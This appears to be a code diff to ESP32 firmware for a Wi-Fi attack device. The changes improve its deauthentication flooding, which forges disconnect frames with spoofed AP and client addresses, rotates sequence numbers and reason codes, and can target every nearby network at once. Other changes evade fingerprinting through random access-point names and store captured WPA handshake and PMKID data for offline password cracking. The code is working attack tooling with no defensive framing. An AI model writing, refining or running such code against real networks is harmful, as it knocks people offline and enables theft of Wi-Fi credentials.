@@ -28,6 +28,7 @@
 #include "esp_heap_caps.h"
 #include <FS.h>
 #include <SPIFFS.h>
+#include <Preferences.h>
 
 // Required so ESP32 accepts raw 802.11 TX frames.
 // PlatformIO links with -Wl,--wrap=ieee80211_raw_frame_sanity_check so all
@@ -136,11 +137,8 @@ static bool radioAcquire(uint8_t want) {
     }
     delay(1);
   }
-  // Last resort: force claim
-  portENTER_CRITICAL(&radioMux);
-  radioOwner = want;
-  portEXIT_CRITICAL(&radioMux);
-  return true;
+  Serial.printf("[RADIO] acquire fail want=%u owner=%u\n", (unsigned)want, (unsigned)radioOwner);
+  return false;
 }
 
 static void radioRelease(uint8_t own) {
@@ -148,6 +146,36 @@ static void radioRelease(uint8_t own) {
   if (radioOwner == own) radioOwner = RADIO_NONE;
   portEXIT_CRITICAL(&radioMux);
 }
+
+// Soft-AP credentials: random password generated once, stored in NVS (not the public default)
+static char webApPass[17] = {0};
+static Preferences webPrefs;
+
+static const char* webApPassword() {
+  if (webApPass[0]) return webApPass;
+  webPrefs.begin("typhon", false);
+  String saved = webPrefs.getString("ap_pass", "");
+  if (saved.length() >= 8) {
+    strncpy(webApPass, saved.c_str(), sizeof(webApPass) - 1);
+  } else {
+    // 12 hex chars from hardware RNG
+    for (int i = 0; i < 12; i++) {
+      uint8_t v = (uint8_t)(esp_random() & 0x0F);
+      webApPass[i] = (char)(v < 10 ? '0' + v : 'a' + (v - 10));
+    }
+    webApPass[12] = 0;
+    webPrefs.putString("ap_pass", webApPass);
+    Serial.printf("[WEB] Soft-AP password (also in NVS): %s\n", webApPass);
+  }
+  webPrefs.end();
+  return webApPass;
+}
+
+static void webSoftAP(uint8_t ch = 1, uint8_t maxConn = 4) {
+  if (ch < 1 || ch > 13) ch = 1;
+  WiFi.softAP("ESP32-TYPHON", webApPassword(), ch, 0, maxConn);
+}
+
 
 // Tool activity flags (early for dual-core workers)
 static volatile bool deauthRunning = false;  // full def also in Deauth section — must match
@@ -183,11 +211,18 @@ static void typhoonMaxWifiTx() {
 
 static void typhoonApplyWarRadio() {
   if (warMode && !webMode) {
-    // Full control of radio — no Soft-AP contention
+    // Active TX tools already own inject SoftAP on the *target* channel.
+    // Rebuilding SoftAP on CH1 here desyncs AP iface from PHY — kills deauth.
+    if (deauthRunning || probeRunning || floodRunning || beaconRunning || karmaRunning) {
+      typhoonMaxWifiTx();
+      return;
+    }
     WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_AP);
-    // Hidden minimal AP so WIFI_IF_AP exists for 80211_tx
-    WiFi.softAP("esp32", "x", 1, 0, 1);  // open-looking but passworded; not hidden (avoids "t" fingerprint)
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.disconnect(false, false);
+    char ssid[12];
+    snprintf(ssid, sizeof(ssid), "t%04x", (unsigned)(esp_random() & 0xFFFF));
+    WiFi.softAP(ssid, nullptr, 1, 0, 0);
   }
   typhoonMaxWifiTx();
 }
@@ -254,10 +289,10 @@ static bool webSafeBlocksPromisc() { return webSafeActive(); }
 struct EapolHit {
   uint8_t bssid[6];
   uint8_t sta[6];
-  uint8_t snap[4];
-  uint16_t len;
+  uint16_t len;           // body length stored
   uint8_t  hasPmkid;
   uint8_t  pmkid[16];
+  uint8_t  body[96];      // raw EAPOL bytes for offline use
   int8_t   rssi;
   uint32_t t;
 };
@@ -278,10 +313,15 @@ static void IRAM_ATTR eapolPush(const uint8_t* bssid, const uint8_t* sta,
   }
   EapolHit* h = &eapolHits[n];
   for (int i = 0; i < 6; i++) { h->bssid[i] = bssid[i]; h->sta[i] = sta[i]; }
+  if (blen > 96) blen = 96;
   h->len = blen;
   h->rssi = rssi;
   h->hasPmkid = pmkid ? 1 : 0;
   if (pmkid && pk) for (int i = 0; i < 16; i++) h->pmkid[i] = pk[i];
+  else for (int i = 0; i < 16; i++) h->pmkid[i] = 0;
+  if (body && blen) {
+    for (uint16_t i = 0; i < blen; i++) h->body[i] = body[i];
+  }
   h->t = 0;
   eapolCount = n + 1;
   portEXIT_CRITICAL(&eapolMux);
@@ -334,21 +374,38 @@ static void IRAM_ATTR eapolSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type
 }
 
 static void eapolLogToSpiffs() {
-  // Best-effort append last hit
   if (eapolCount <= 0) return;
+  // Cap log growth (~64KB)
+  fs::File check = SPIFFS.open("/eapol.log", FILE_READ);
+  if (check) {
+    size_t sz = check.size();
+    check.close();
+    if (sz > 65536) SPIFFS.remove("/eapol.log");
+  }
   fs::File f = SPIFFS.open("/eapol.log", FILE_APPEND);
   if (!f) return;
   int i = eapolCount - 1;
   if (i < 0) i = 0;
   if (i >= EAPOL_MAX) i = EAPOL_MAX - 1;
-  char line[128];
-  snprintf(line, sizeof(line),
-    "%02X%02X%02X%02X%02X%02X,%02X%02X%02X%02X%02X%02X,pmkid=%d,rssi=%d\n",
-    eapolHits[i].bssid[0], eapolHits[i].bssid[1], eapolHits[i].bssid[2],
-    eapolHits[i].bssid[3], eapolHits[i].bssid[4], eapolHits[i].bssid[5],
-    eapolHits[i].sta[0], eapolHits[i].sta[1], eapolHits[i].sta[2],
-    eapolHits[i].sta[3], eapolHits[i].sta[4], eapolHits[i].sta[5],
-    (int)eapolHits[i].hasPmkid, (int)eapolHits[i].rssi);
+  const EapolHit& h = eapolHits[i];
+  // CSV: bssid,sta,rssi,pmkid_hex,body_hex
+  char line[320];
+  int n = snprintf(line, sizeof(line),
+    "%02X%02X%02X%02X%02X%02X,%02X%02X%02X%02X%02X%02X,%d,",
+    h.bssid[0], h.bssid[1], h.bssid[2], h.bssid[3], h.bssid[4], h.bssid[5],
+    h.sta[0], h.sta[1], h.sta[2], h.sta[3], h.sta[4], h.sta[5],
+    (int)h.rssi);
+  if (h.hasPmkid) {
+    for (int k = 0; k < 16 && n < (int)sizeof(line) - 3; k++)
+      n += snprintf(line + n, sizeof(line) - n, "%02X", h.pmkid[k]);
+  } else {
+    n += snprintf(line + n, sizeof(line) - n, "-");
+  }
+  n += snprintf(line + n, sizeof(line) - n, ",");
+  uint16_t bl = h.len > 96 ? 96 : h.len;
+  for (uint16_t k = 0; k < bl && n < (int)sizeof(line) - 3; k++)
+    n += snprintf(line + n, sizeof(line) - n, "%02X", h.body[k]);
+  n += snprintf(line + n, sizeof(line) - n, "\n");
   f.print(line);
   f.close();
 }
@@ -500,7 +557,14 @@ static void karmaStart(uint8_t ch) {
     karmaMac[i] = (uint8_t)esp_random();
   }
   karmaBssid[0] = (karmaBssid[0] | 0x02) & 0xFE;
-  typhoonApplyWarRadio();
+  if (!webMode) {
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.disconnect(false, false);
+    char ks[12];
+    snprintf(ks, sizeof(ks), "t%04x", (unsigned)(esp_random() & 0xFFFF));
+    WiFi.softAP(ks, nullptr, karmaCh, 0, 0);
+  }
+  typhoonMaxWifiTx();
   if (!webSafeBlocksPromisc()) {
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(&karmaSnifferCb2);
@@ -711,10 +775,12 @@ struct WifiNet {
   uint8_t ch;
   bool    hidden;
   uint8_t enc;
+  uint8_t pmf;   // 0=unknown/none 1=capable 2=required (from auth mode heuristic)
 };
 
 static WifiNet  wifiNets[WIFI_MAX_NETS];
-static int      wifiCount = 0;
+static volatile int wifiCount = 0;
+static portMUX_TYPE wifiNetsMux = portMUX_INITIALIZER_UNLOCKED;
 static bool     wifiScanDetail = false;
 static bool     wifiScanning = false;
 
@@ -764,6 +830,7 @@ static void wifiScanUpdate() {
   wifiScanning = false;
   if (r < 0) { wifiCount = 0; return; }
 
+  portENTER_CRITICAL(&wifiNetsMux);
   wifiCount = min((int)r, WIFI_MAX_NETS);
   for (int i = 0; i < wifiCount; i++) {
     wifiNets[i].ssid = WiFi.SSID(i);
@@ -775,6 +842,16 @@ static void wifiScanUpdate() {
     wifiNets[i].rssi = WiFi.RSSI(i);
     wifiNets[i].ch   = WiFi.channel(i);
     wifiNets[i].enc  = (uint8_t)WiFi.encryptionType(i);
+    // Heuristic: WPA3 / WPA2+WPA3 imply PMF required or capable (Arduino has no RSNIE parse)
+    {
+      wifi_auth_mode_t am = WiFi.encryptionType(i);
+      if (am == WIFI_AUTH_WPA3_PSK || am == WIFI_AUTH_WPA2_WPA3_PSK)
+        wifiNets[i].pmf = 2;  // required on WPA3 path
+      else if (am == WIFI_AUTH_WPA2_PSK || am == WIFI_AUTH_WPA_WPA2_PSK)
+        wifiNets[i].pmf = 1;  // often MFPC on modern APs — unprotected deauth may fail
+      else
+        wifiNets[i].pmf = 0;
+    }
     wifiNets[i].hidden = (wifiNets[i].ssid.length() == 0);
     if (wifiNets[i].hidden) wifiNets[i].ssid = "<hidden>";
   }
@@ -783,6 +860,7 @@ static void wifiScanUpdate() {
       if (wifiNets[j].rssi > wifiNets[i].rssi) {
         WifiNet t = wifiNets[i]; wifiNets[i] = wifiNets[j]; wifiNets[j] = t;
       }
+  portEXIT_CRITICAL(&wifiNetsMux);
   WiFi.scanDelete();
   radioRelease(RADIO_WIFI_SCAN);
   if (webMode) restoreWebAP();
@@ -984,11 +1062,12 @@ static void beaconStart() {
   if (webMode) {
     // Keep ESP32-TYPHON AP; only change channel for TX
     WiFi.mode(WIFI_AP);
-    WiFi.softAP("ESP32-TYPHON", "rgisking", beaconCh, 0, 4);
+    webSoftAP(beaconCh, 4);
   } else {
     WiFi.mode(WIFI_AP);
     // minimal AP so WIFI_IF_AP exists for TX
-    WiFi.softAP("esp32div", nullptr, beaconCh, 1 /* hidden */, 0);
+    { char _s[12]; snprintf(_s, sizeof(_s), "t%04x", (unsigned)(esp_random()&0xFFFF));
+      WiFi.softAP(_s, nullptr, beaconCh, 1, 1); }
   }
   radioSettleRequest(20);
   esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
@@ -1127,6 +1206,10 @@ static void IRAM_ATTR detSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
 }
 
 static void detStart() {
+  if (!radioAcquire(RADIO_WIFI_SCAN)) {
+    Serial.println("[DET] radio busy");
+    return;
+  }
   deauthCount = 0;
   detMacSeen = false;
   detLastRssi = 0;
@@ -1153,6 +1236,7 @@ static void detStop() {
   detRunning = false;
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(NULL);
+  radioRelease(RADIO_WIFI_SCAN);
   if (webMode) restoreWebAP();
 }
 
@@ -1267,7 +1351,9 @@ static void clientQDrain() {
   uint32_t now = millis();
   portENTER_CRITICAL(&clientMux);
   for (int i = 0; i < clientCount; ) {
-    if (now - clients[i].lastSeen > 60000UL) {
+    // During deauth keep clients longer (randomized MAC reconnects)
+    uint32_t ageLim = deauthRunning ? 300000UL : 60000UL;
+    if (now - clients[i].lastSeen > ageLim) {
       for (int j = i; j < clientCount - 1; j++) clients[j] = clients[j + 1];
       clientCount--;
     } else i++;
@@ -1350,71 +1436,160 @@ static void clientSniffUpdate() {
 }
 
 // ----- Deauth -----
-// Cross-core: UI/web on core1, wifiCoreLoop deauthUpdate on core0.
-// All shared state is volatile; deauthTx snapshots target under consistency check.
+// Core0: deauthUpdate. Core1: UI/web stop/start.
+// Frames built on stack; sequence numbers monotonic; duration=0; PMF warned not broken.
 
-static volatile int  deauthTarget = -1;   // >=0 single AP, -2 = all, -1 = stopped
+static volatile int  deauthTarget = -1;
 static volatile uint32_t deauthSent = 0;
 static uint32_t deauthLast = 0;
-static uint8_t  deauthPacket[26];         // spec: 24 hdr + 2 reason
 static volatile int deauthClientIdx = 0;
-static volatile uint8_t deauthPhase = 0;   // 0=bcast deauth 1=bcast disassoc 2=unicast
-static int deauthRoundIdx = 0;            // file-scope; reset in deauthStartAll
+static volatile uint8_t deauthPhase = 0;
+static int deauthRoundIdx = 0;
+static uint16_t deauthSeq = 0;           // fallback / single-target
+static uint8_t  deauthSeqMac[32][6];     // attack-all per-BSSID seq map
+static uint16_t deauthSeqVal[32];
+static uint8_t  deauthSeqSlots = 0;
+
+static uint16_t deauthSeqBump(uint16_t s) {
+  s = (uint16_t)((s + 1) & 0x0FFF);
+  if (s == 0) s = 1;  // never emit seq 0 (replay-window reset risk)
+  return s;
+}
+
+static uint16_t deauthNextSeqFor(const uint8_t* bssid) {
+  if (!bssid) {
+    uint16_t s = deauthSeq ? deauthSeq : 1;
+    deauthSeq = deauthSeqBump(s);
+    return s;
+  }
+  for (uint8_t i = 0; i < deauthSeqSlots; i++) {
+    if (memcmp(deauthSeqMac[i], bssid, 6) == 0) {
+      uint16_t s = deauthSeqVal[i] ? deauthSeqVal[i] : 1;
+      deauthSeqVal[i] = deauthSeqBump(s);
+      return s;
+    }
+  }
+  // 32 slots for denser environments
+  if (deauthSeqSlots < 32) {
+    uint8_t i = deauthSeqSlots++;
+    memcpy(deauthSeqMac[i], bssid, 6);
+    uint16_t seed = (uint16_t)((esp_random() & 0x0F00) | 0x0001);
+    deauthSeqVal[i] = deauthSeqBump(seed);
+    return seed;
+  }
+  // Evict slot 0 (simple rotation) rather than shared counter
+  memmove(deauthSeqMac[0], deauthSeqMac[1], 31 * 6);
+  memmove(deauthSeqVal, deauthSeqVal + 1, 31 * sizeof(uint16_t));
+  deauthSeqSlots = 31;
+  uint8_t i = deauthSeqSlots++;
+  memcpy(deauthSeqMac[i], bssid, 6);
+  uint16_t seed = (uint16_t)((esp_random() & 0x0F00) | 0x0001);
+  deauthSeqVal[i] = deauthSeqBump(seed);
+  return seed;
+}
+static uint8_t deauthReasonIdx = 0;
+static uint8_t deauthLockedCh = 1;
+static int deauthLockedTgt = -1;
+static uint8_t deauthBssidSnap[6];
+static uint8_t deauthPmfSnap = 0;
 
 static const uint16_t DEAUTH_REASONS[] = {1, 3, 4, 6, 7, 8, 15, 16};
 static const int DEAUTH_REASON_N = 8;
 
-static void deauthBuildTo(uint8_t* out, const uint8_t* dest, const uint8_t* bssid, bool disassoc, uint16_t reason = 1) {
+// dest=RA, transmitter=TA, bssid=BSSID (addr3)
+static void deauthBuildTo(uint8_t* out, const uint8_t* dest, const uint8_t* transmitter,
+                          const uint8_t* bssid, bool disassoc, uint16_t reason) {
   memset(out, 0, 26);
   out[0] = disassoc ? 0xA0 : 0xC0;
-  out[1] = 0x00;
-  out[2] = 0x3A; out[3] = 0x01;
+  out[1] = 0x00;                 // no ToDS/FromDS; unprotected (cannot forge PMF MIC)
+  out[2] = 0x00; out[3] = 0x00;  // duration 0 — deauth expects no response
   memcpy(out + 4, dest, 6);
-  memcpy(out + 10, bssid, 6);
+  memcpy(out + 10, transmitter, 6);
   memcpy(out + 16, bssid, 6);
+  // Sequence control: frag=0, per-BSSID monotonic seq
+  uint16_t seq = deauthNextSeqFor(bssid);
+  uint16_t sc = (uint16_t)((seq & 0x0FFF) << 4);
+  out[22] = (uint8_t)(sc & 0xFF);
+  out[23] = (uint8_t)((sc >> 8) & 0xFF);
   out[24] = (uint8_t)(reason & 0xFF);
   out[25] = (uint8_t)((reason >> 8) & 0xFF);
 }
 
-static void deauthRadioPrep(uint8_t ch) {
+// Random short SoftAP name — avoid static "esp32div" fingerprint
+static wifi_mode_t deauthCachedMode = WIFI_MODE_NULL;
+
+static void deauthOpenInjectIface(uint8_t ch) {
   if (ch < 1 || ch > 13) ch = 1;
-  if (webMode) {
-    WiFi.mode(WIFI_AP_STA);
-  } else {
-    WiFi.mode(WIFI_AP);
-    WiFi.softAP("esp32div", nullptr, ch, 1, 0);
-  }
-  esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
+  char ssid[12];
+  snprintf(ssid, sizeof(ssid), "t%04x", (unsigned)(esp_random() & 0xFFFF));
+  // AP_STA: AP for inject + dormant STA iface so dual 80211_tx works on handheld
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.disconnect(false, false);
+  WiFi.softAP(ssid, nullptr, ch, 0 /* not hidden */, 0 /* default max conn */);
+  deauthCachedMode = WIFI_MODE_APSTA;
 }
 
 static void deauthStart(int targetIdx) {
-  if (targetIdx < 0 || targetIdx >= wifiCount) return;
-  clientSniffStop();
-  radioAcquire(RADIO_WIFI_TX);
+  int wc;
+  portENTER_CRITICAL(&wifiNetsMux);
+  wc = wifiCount;
+  portEXIT_CRITICAL(&wifiNetsMux);
+  if (targetIdx < 0 || targetIdx >= wc) return;
+  if (webMode) {
+    Serial.println("[DEAUTH] web Soft-AP pins CH1 — leave web mode for off-channel deauth");
+  }
+  clientSniffStop();  // keeps clientCount + clientSniffBssid for unicast
+  if (clientCount <= 0)
+    Serial.println("[DEAUTH] no sniffed STAs — broadcast only (run Client Sniffer first)");
+  else
+    Serial.print("[DEAUTH] sniffed STAs ready for unicast: "); Serial.println(clientCount);
+  if (!radioAcquire(RADIO_WIFI_TX)) {
+    Serial.println("[DEAUTH] radio busy");
+    return;
+  }
   deauthTarget = targetIdx;
   deauthRunning = true;
   deauthSent = 0;
   deauthLast = 0;
   deauthClientIdx = 0;
   deauthPhase = 0;
-  uint8_t ch = wifiNets[targetIdx].ch;
+  deauthSeq = (uint16_t)((esp_random() & 0x0F00) | 0x0001);
+  deauthSeqSlots = 0;
+
+  uint8_t ch;
+  uint8_t pmf;
+  portENTER_CRITICAL(&wifiNetsMux);
+  ch = wifiNets[targetIdx].ch;
+  pmf = wifiNets[targetIdx].pmf;
+  memcpy(deauthBssidSnap, wifiNets[targetIdx].bssid, 6);
+  portEXIT_CRITICAL(&wifiNetsMux);
   if (ch < 1 || ch > 13) ch = 1;
+  deauthLockedCh = ch;
+  deauthLockedTgt = targetIdx;
+  deauthSeqSlots = 0;
+  deauthPmfSnap = pmf;
+  if (pmf >= 2)
+    Serial.println("[DEAUTH] WARN: target likely PMF-required — unprotected frames often ignored");
+  else if (pmf == 1)
+    Serial.println("[DEAUTH] WARN: WPA2 target may use optional PMF");
+
   if (webMode) {
     WiFi.mode(WIFI_AP_STA);
-    WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
+    WiFi.disconnect(false, false);
+    webSoftAP(1, 4);
+    deauthCachedMode = WIFI_MODE_APSTA;
   } else {
-    WiFi.mode(WIFI_AP);
-    WiFi.softAP("esp32div", nullptr, ch, 1, 0);
+    deauthOpenInjectIface(ch);
   }
-  radioSettleRequest(10);
+  radioSettleRequest(40);
   typhoonMaxWifiTx();
-  typhoonApplyWarRadio();
   wifiLockChannel(ch);
 }
 
 static void deauthStop() {
   deauthRunning = false;
   deauthTarget = -1;
+  deauthLockedTgt = -1;
   radioRelease(RADIO_WIFI_TX);
   if (webMode && !warMode) restoreWebAP();
   else {
@@ -1423,121 +1598,184 @@ static void deauthStop() {
   }
 }
 
-// Snapshot target index once — never re-read after channel lock (TOCTOU-safe)
-static void deauthTx(const uint8_t* frame, int targetSnap, uint8_t chSnap) {
+// TX only — channel already locked this tick
+static uint32_t deauthTxFail = 0;
+
+static void deauthTx(const uint8_t* frame) {
   if (!deauthRunning) return;
-  if (targetSnap >= 0 && targetSnap < wifiCount)
-    wifiLockChannel(chSnap ? chSnap : wifiNets[targetSnap].ch);
-  esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);  // 26-byte deauth/disassoc
-  deauthSent++;
+  bool ok = false;
+  esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
+  if (e == ESP_OK) ok = true;
+  else delay(1);
+  // Dual-inject when STA iface exists (cached at start — no per-frame get_mode)
+  if (deauthCachedMode == WIFI_MODE_STA || deauthCachedMode == WIFI_MODE_APSTA) {
+    e = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
+    if (e == ESP_OK) ok = true;
+  }
+  if (ok) deauthSent++;
+  else deauthTxFail++;
 }
 
 static void deauthRestoreWebCh() {
   if (webMode) wifiStayOnApChannel();
 }
 
+static void deauthSendPair(const uint8_t* ra, const uint8_t* ta, const uint8_t* bssid,
+                           uint16_t reason, bool bothTypes) {
+  uint8_t pkt[26];
+  // Rebuild each TX so sequence number advances (no exact seq replay)
+  deauthBuildTo(pkt, ra, ta, bssid, false, reason);
+  deauthTx(pkt);
+  deauthBuildTo(pkt, ra, ta, bssid, false, reason);
+  deauthTx(pkt);
+  if (bothTypes) {
+    deauthBuildTo(pkt, ra, ta, bssid, true, reason);
+    deauthTx(pkt);
+  }
+}
+
 static void deauthUpdate() {
   if (!deauthRunning) return;
+  if (!radioSettled()) return;  // wait mode transition
 
-  // Snapshot volatile target once per tick
   int tgt = deauthTarget;
-  int wc = wifiCount;
+  int wc;
+  portENTER_CRITICAL(&wifiNetsMux);
+  wc = wifiCount;
+  portEXIT_CRITICAL(&wifiNetsMux);
 
-  // Attack-all: cycle APs — never call wifiScanStart() (that calls deauthStop!)
+  // ---- attack-all ----
   if (tgt == -2) {
     if (wc <= 0) { deauthStop(); return; }
-    if (millis() - deauthLast < 6) return;
+    if (millis() - deauthLast < 12) return;
     deauthLast = millis();
     if (deauthRoundIdx >= wc) deauthRoundIdx = 0;
     int ti = deauthRoundIdx++;
     if (ti < 0 || ti >= wc) return;
-    uint8_t ch = wifiNets[ti].ch;
+
+    uint8_t ch, bssid[6], pmf;
+    portENTER_CRITICAL(&wifiNetsMux);
+    ch = wifiNets[ti].ch;
+    pmf = wifiNets[ti].pmf;
+    memcpy(bssid, wifiNets[ti].bssid, 6);
+    portEXIT_CRITICAL(&wifiNetsMux);
     if (ch < 1 || ch > 13) ch = 1;
-    esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
-    const uint8_t* bssid = wifiNets[ti].bssid;
+    if (ch != deauthLockedCh) {
+      wifiLockChannel(wifiTxChannel(ch));
+      deauthLockedCh = ch;
+      radioSettleRequest(10);
+      return;  // next tick after PHY retune
+    }
+
     uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-    deauthBuildTo(deauthPacket, bcast, bssid, false);
-    for (int i = 0; i < 6; i++) deauthTx(deauthPacket, ti, ch);
-    deauthBuildTo(deauthPacket, bcast, bssid, true);
-    for (int i = 0; i < 3; i++) deauthTx(deauthPacket, ti, ch);
-    // Unicast known clients for this AP (read clientCount under mux)
+    uint16_t reason = DEAUTH_REASONS[deauthReasonIdx % DEAUTH_REASON_N];
+    deauthReasonIdx++;
+    uint8_t pkt[26];
+
+    // AP→STA broadcast deauth + disassoc
+    for (int n = 0; n < 4; n++) {
+      deauthBuildTo(pkt, bcast, bssid, bssid, false, reason);
+      deauthTx(pkt);
+    }
+    for (int n = 0; n < 2; n++) {
+      deauthBuildTo(pkt, bcast, bssid, bssid, true, reason);
+      deauthTx(pkt);
+    }
+
+    // Known clients: both directions
     portENTER_CRITICAL(&clientMux);
     int cc = clientCount;
-    int sniffAp = clientSniffAp;
-    uint8_t localMacs[CLIENT_MAX][6];
+    uint8_t localMacs[48][6];
     int nCopy = 0;
-    if (sniffAp == ti && cc > 0) {
-      nCopy = cc > CLIENT_MAX ? CLIENT_MAX : cc;
+    // Match by BSSID — menu index can disagree with sniff after rescan/ALL row
+    if (cc > 0 && memcmp(bssid, clientSniffBssid, 6) == 0) {
+      nCopy = cc > 48 ? 48 : cc;
       for (int c = 0; c < nCopy; c++)
         for (int k = 0; k < 6; k++) localMacs[c][k] = clients[c].mac[k];
     }
     portEXIT_CRITICAL(&clientMux);
     for (int c = 0; c < nCopy; c++) {
-      deauthBuildTo(deauthPacket, localMacs[c], bssid, false);
-      deauthTx(deauthPacket, ti, ch);
-      deauthTx(deauthPacket, ti, ch);
+      // AP → STA
+      deauthSendPair(localMacs[c], bssid, bssid, reason, true);
+      // STA → AP
+      deauthSendPair(bssid, localMacs[c], bssid, reason, true);
     }
     deauthRestoreWebCh();
     return;
   }
 
-  if (tgt < 0 || tgt >= wc) {
+  if (tgt < 0 || tgt >= wc) { deauthStop(); return; }
+  {
+    uint32_t gap = webMode ? 15 : 10;
+    if (deauthPhase == 2) gap = webMode ? 5 : 3;
+    if (millis() - deauthLast < gap) return;
+  }
+  deauthLast = millis();
+
+  // Snapshot AP under lock once per tick
+  uint8_t bssid[6], ch, pmf;
+  portENTER_CRITICAL(&wifiNetsMux);
+  if (tgt >= wifiCount) {
+    portEXIT_CRITICAL(&wifiNetsMux);
     deauthStop();
     return;
   }
-  if (millis() - deauthLast < (webMode ? 12 : 3)) return;
-  deauthLast = millis();
-
-  // Snapshot AP fields while target still valid
-  const uint8_t* bssid = wifiNets[tgt].bssid;
-  uint8_t ch = wifiNets[tgt].ch;
+  memcpy(bssid, wifiNets[tgt].bssid, 6);
+  ch = wifiNets[tgt].ch;
+  pmf = wifiNets[tgt].pmf;
+  portEXIT_CRITICAL(&wifiNetsMux);
   if (ch < 1 || ch > 13) ch = 1;
-  esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
+  if (ch != deauthLockedCh) {
+    wifiLockChannel(wifiTxChannel(ch));
+    deauthLockedCh = ch;
+    radioSettleRequest(8);
+    return;
+  }
+  deauthPmfSnap = pmf;
 
   uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-  static uint8_t reasonIdx = 0;
-  uint16_t reason = DEAUTH_REASONS[reasonIdx % DEAUTH_REASON_N];
-  reasonIdx++;
-
+  uint16_t reason = DEAUTH_REASONS[deauthReasonIdx % DEAUTH_REASON_N];
+  deauthReasonIdx++;
   uint8_t phase = deauthPhase;
+  uint8_t pkt[26];
 
   if (phase == 0) {
-    deauthBuildTo(deauthPacket, bcast, bssid, false, reason);
-    for (int i = 0; i < 8; i++) deauthTx(deauthPacket, tgt, ch);
+    for (int n = 0; n < 6; n++) {
+      deauthBuildTo(pkt, bcast, bssid, bssid, false, reason);
+      deauthTx(pkt);
+    }
 
-    // STA→AP only with REAL client MACs (random MAC is ignored by AP)
     portENTER_CRITICAL(&clientMux);
     int cc = clientCount;
-    int sniffAp = clientSniffAp;
-    uint8_t localMacs[16][6];
+    uint8_t localMacs[48][6];
     int nCopy = 0;
-    if (sniffAp == tgt && cc > 0) {
-      nCopy = cc > 16 ? 16 : cc;
+    if (cc > 0 && memcmp(bssid, clientSniffBssid, 6) == 0) {
+      nCopy = cc > 48 ? 48 : cc;
       for (int c = 0; c < nCopy; c++)
         for (int k = 0; k < 6; k++) localMacs[c][k] = clients[c].mac[k];
     }
     portEXIT_CRITICAL(&clientMux);
     for (int c = 0; c < nCopy; c++) {
-      // dest=AP, source=real STA, BSSID=AP
-      deauthBuildTo(deauthPacket, bssid, localMacs[c], false, reason);
-      memcpy(deauthPacket + 16, bssid, 6);
-      deauthTx(deauthPacket, tgt, ch);
+      deauthSendPair(localMacs[c], bssid, bssid, reason, true); // AP→STA
+      deauthSendPair(bssid, localMacs[c], bssid, reason, true); // STA→AP
     }
     deauthPhase = 1;
   } else if (phase == 1) {
-    deauthBuildTo(deauthPacket, bcast, bssid, true, reason);
-    for (int i = 0; i < 5; i++) deauthTx(deauthPacket, tgt, ch);
+    for (int n = 0; n < 4; n++) {
+      deauthBuildTo(pkt, bcast, bssid, bssid, true, reason);
+      deauthTx(pkt);
+    }
     portENTER_CRITICAL(&clientMux);
-    bool haveClients = (clientCount > 0 && clientSniffAp == tgt);
+    bool have = (clientCount > 0 && memcmp(bssid, clientSniffBssid, 6) == 0);
     portEXIT_CRITICAL(&clientMux);
-    deauthPhase = haveClients ? 2 : 0;
+    deauthPhase = have ? 2 : 0;
     deauthClientIdx = 0;
   } else {
     uint8_t mac[6];
     int cc;
     portENTER_CRITICAL(&clientMux);
     cc = clientCount;
-    if (cc == 0 || clientSniffAp != tgt) {
+    if (cc == 0 || memcmp(bssid, clientSniffBssid, 6) != 0) {
       portEXIT_CRITICAL(&clientMux);
       deauthPhase = 0;
       deauthRestoreWebCh();
@@ -1546,12 +1784,8 @@ static void deauthUpdate() {
     int c = deauthClientIdx % cc;
     for (int k = 0; k < 6; k++) mac[k] = clients[c].mac[k];
     portEXIT_CRITICAL(&clientMux);
-
-    deauthBuildTo(deauthPacket, mac, bssid, false);
-    deauthTx(deauthPacket, tgt, ch);
-    deauthTx(deauthPacket, tgt, ch);
-    deauthBuildTo(deauthPacket, mac, bssid, true);
-    deauthTx(deauthPacket, tgt, ch);
+    deauthSendPair(mac, bssid, bssid, reason, true);
+    deauthSendPair(bssid, mac, bssid, reason, true);
     deauthClientIdx++;
     if (deauthClientIdx >= cc) {
       deauthClientIdx = 0;
@@ -1563,8 +1797,11 @@ static void deauthUpdate() {
 
 static void deauthStartAll() {
   if (wifiCount <= 0) return;
-  radioAcquire(RADIO_WIFI_TX);
-  deauthRoundIdx = 0;   // deterministic start
+  if (!radioAcquire(RADIO_WIFI_TX)) {
+    Serial.println("[DEAUTH] radio busy");
+    return;
+  }
+  deauthRoundIdx = 0;
   deauthTarget = -2;
   deauthRunning = true;
   deauthRescanLast = millis();
@@ -1572,14 +1809,26 @@ static void deauthStartAll() {
   deauthLast = 0;
   deauthPhase = 0;
   deauthClientIdx = 0;
+  deauthSeq = (uint16_t)((esp_random() & 0x0F00) | 0x0001);
+  deauthSeqSlots = 0;
+  uint8_t startCh = 1;
+  portENTER_CRITICAL(&wifiNetsMux);
+  if (wifiCount > 0) {
+    startCh = wifiNets[0].ch;
+    if (startCh < 1 || startCh > 13) startCh = 1;
+  }
+  portEXIT_CRITICAL(&wifiNetsMux);
   if (webMode) {
     WiFi.mode(WIFI_AP_STA);
-    WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
+    WiFi.disconnect(false, false);
+    webSoftAP(1, 4);
+    deauthCachedMode = WIFI_MODE_APSTA;
   } else {
-    WiFi.mode(WIFI_AP);
-    WiFi.softAP("esp32div", nullptr, 1, 1, 0);
+    deauthOpenInjectIface(startCh);
   }
-  radioSettleRequest(15);
